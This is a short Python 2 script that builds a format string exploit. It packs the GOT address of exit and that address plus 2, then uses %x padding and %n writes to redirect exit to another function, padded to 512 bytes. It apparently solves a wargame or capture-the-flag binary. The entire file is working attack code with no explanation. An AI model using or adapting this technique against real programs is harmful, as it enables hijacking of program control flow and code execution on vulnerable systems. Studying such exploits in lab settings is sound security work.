import struct

O = 0x80484a4 # base 10 is 1345143828
EXIT_GOT = 0x8049838



def pad(s):
	return s+"X"*(512-len(s))

exploit = ""
exploit += struct.pack("I", EXIT_GOT)
exploit += struct.pack("I", EXIT_GOT+2)
exploit += "AAAA"
exploit += "%4$33944x"
exploit += "%4$n"
exploit += "%33632x"
exploit += "%5$n"
print pad(exploit)
